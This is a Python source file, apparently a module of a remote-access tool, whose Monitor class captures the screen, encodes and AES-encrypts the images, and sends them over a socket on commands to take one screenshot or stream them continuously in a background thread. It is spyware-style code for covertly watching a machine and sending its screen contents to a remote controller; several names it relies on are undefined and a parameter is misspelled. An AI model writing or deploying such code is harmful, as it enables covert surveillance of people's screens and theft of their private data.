import pyscreenshot
from io import BytesIO
import base64
import threading

class Monitor:
    def __init__(self, sock) -> None:
        self.record = False
        self.sock = sock

    def screenshot(self):
        try:
            img_buffer = BytesIO()
            image = pyscreenshot.grab()
            image.save(img_buffer, 'jpeg', quailty=80)

            img_buffer = img_buffer.getvalue()
            img_b64 = base64.b64encode(img_buffer).decode('utf-8')
            return f'1|{img_b64}'
        except Exception as e:
            return f'0|{b64EnStr(str(e))}'
        
    def monitor(self):
        while self.record:
            payload = self.screenshot()
            payload = f'Mon|s|{payload}'
            buffer = b64EnStr(payload)
            self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

    def run(self):
        cmd = para[0]
        payload = ''
        if cmd == 's': # SCREEN SHOT
            payload = self.screenshot()
            payload = f'Mon|s|{payload}'
        elif cmd == 'm_start': # MONITOR START
            if self.record == False:
                self.record = True
                threading.Thread(target=self.monitor).start()
        elif cmd == 'm_stop': # MONITOR STOP
            self.record = False

        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))